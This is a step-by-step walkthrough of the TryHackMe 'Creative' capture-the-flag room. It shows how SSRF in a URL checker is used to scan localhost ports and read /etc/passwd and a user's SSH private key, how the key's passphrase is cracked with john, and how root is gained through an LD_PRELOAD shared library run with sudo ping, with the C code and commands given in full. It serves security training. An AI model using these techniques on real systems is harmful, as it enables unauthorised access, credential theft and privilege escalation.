# Creative
<br/>

## Intro
Welcome in another challenge, in this CTF we have to investigate an infected host.
The original link to the room on TryHackMe is: https://tryhackme.com/r/room/creative <br>
This CTF will focus on the exploitation of web applications thanks to some missconfigurations,

As always in the THM challenges i will not post the answers but a step by step guide to get them. Find out more in the README.md file.

Whenever you feel ready start the machine and connect to via OpenVPN or the AttackBox.

<br/>
<br/>

## The Challenge

### Reconnaissance
As always we cannot start without doing some recon about our target, we can use nmap to help us in the job.
```bash
nmap -sV MACHINE_iP
```

We can see that there are 2 open ports:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Lets go to take a look at the website, but to successfully view it we have to add the hostname to the hosts file first:
```bash
sudo nano /etc/hosts
```
Inside add:
```
MACHINE-IP     creative.thm
```

Now we are ready to view it!

It is a website of a company called Creative Studio.
Running a directory scan with *Gobuster* i got 1 interesting path "/assets"
```bash
gobuster dir -u http://creative.thm  -w /usr/share/wordlists/dirb/common.txt -t 50 -k
```

If we try to visit it we get a 403 error Forbidden, this means that we do not have the necessary authority to access that resource.

We can try to look if there might be some subdomains:
```bash
gobuster vhost -u http://creative.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --append-domain
```

And in a couple of seconds we can see that there is one: beta.creative.thm, let's add it to the hosts file as well:
```bash
sudo nano /etc/hosts
```
```
MACHINE-IP     creative.thm    beta.creative.thm
```

<br/>

### Gaining Access 
Now we can navigate to it:
```
http://beta.creative.thm
```

In this new website we can see a web-form where we can submit an URL to check if it is alive.

Capturing a test request via Burp Suite proxy feature i was able to see that after you write an URL it get's url encoded and then posted, we should get a response either "dead" or the page content.
I am curious if it can open files on my machine:

On your machine crate a random file with "hello" inside
```bash
nano test.txt
```

in the same directory create a webserver with python (default port 8000)
```bash
 python3 -m http.server 
```

Now into the subdomain webpage let's try to view the test file by inserting:
```
http://YOUR_IP:8000/test.html
```

It does.
An interesting happened when i tried to insert the localhost as IP, it opened it this means that we can communicate with internal resources, AKA we are doing SSRF attacks (Server Side Request Forgery).

Knowing of this vulnerability we can enumerate the localhost to check if there are any open services we can communicate with.
We can either do this by testing all ports by hand inserting:
```
http://localhost:n
```
where `n` is the port number -> not suggested lol.

Or find a tool that does it for us, or use burp suite intruder or create our own script, you can chose the one that you prefer.
Also Intruder will be very slow if you have the community version.

I had nothing better to do so i created a python script, to make it work you have to create a text file containing the headers of the request captured before with burp suite.
It will stop when it find an open port.
```python
import requests  
  
base_url = 'http://beta.creative.thm'  
  
def read_headers_from_file(file_path):  
    headers = {}  
    with open(file_path, 'r') as f:  
        for line in f:  
            key, value = line.strip().split(': ')  
            headers[key] = value  
    return headers  
  
def send_post_request(url, payload):  
    headers = read_headers_from_file('headers.txt')  
    response = requests.post(url, data=payload, headers=headers)  
    content_length = response.headers.get('Content-Length')  
    if content_length != '13':  # 13 was the lengh of "dead" response 
        print(f"POST request to {url} with payload {payload} returned status code: {response.status_code}, content length: {content_length}")  
  
for port in range(1, 65536):  
    url = f"http://localhost:{port}"  
    payload = f"url=http%3A%2F%2Flocalhost%3A{port}"  
    send_post_request(base_url, payload)
```

Now we know that port 1337 is open let's see, we can try submitting this URL to get the passwd file 
```
http://localhost:1337/etc/passwd
```

Now we know there is an user called "saad"; from before we remember that the SSH port was open, let's see if we can grab this user ssh key and use it to connect on his behalf.
```
http://localhost:1337/home/saad/.ssh/id_rsa
```

We can see that file cool, now we make a copy of it on our machine
```bash
nano saad-id_rsa
```

We need to change the key file permissions before using it:
```bash
chmod 600 saad-id_rsa 
```

Now we can login via SSH
```bash
ssh -i saad-id_rsa saad@creative.thm 
```

Unfortunately the key is protected with a password, let's find it with John's help
```bash
ssh2john saad-id_rsa > saad-id_rsa2
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt saad-id_rsa2
```

And in less than a minute we get it: sweetness  
Now we can run the SSH command again and we are logged in.

Here we can view the directory content with `ls` and open the user.txt file containing the first flag
```bash
cat user.txt
```
--> REDACTED

<br/>

### Privilege Escalation
Now we need to work our way up to root.

Looking inside the user home folder there is the file containing the bash commands that have been executed, this is a nice starting point to look for data leaks.
```bash
cat .bash_history
```
and we have the user password: MyStrongestPasswordYet$4291

Now we can see if we have the permission to run any command as sudo:
```bash
sudo -l
```
yes we can run this one:
```
Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping
```

Let's try it
```bash
sudo /usr/bin/ping m4lware
```

We can obviously see all the packets being transmitted, but that alone is not really useful to our purpose.

Another thing to notice from the result above is `env_keep+=LD_PRELOAD` which will let us keep the environmental variable `LD_PRELOAD` when running a command with `sudo`.

If we are  able to create a shared library that contains malicious code and make it being loaded thanks to `LD_PRELOAD`;
what should happen is that when we run the ping binary with sudo the  library will be loaded, ad the malicious code will be executed with elevated privileges.

So let's create a shared library:
```bash
cd /tmp
```
```bash
nano shell.c
```
paste this inside:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

Now we need to compile the library, we can use the *gcc* utility:
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Finally we are ready to use our sudo powers with the ping command to spawn a root shell:
```
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
```

And we have the shell as root, we can navigate to the root directory and 
```bash
cat root.txt
```

--> REDACTED

<br/>
<br/>

Congratulations, you have completed the Creative challenge, thanks for following along.

I hope to see you again in another challege 😊
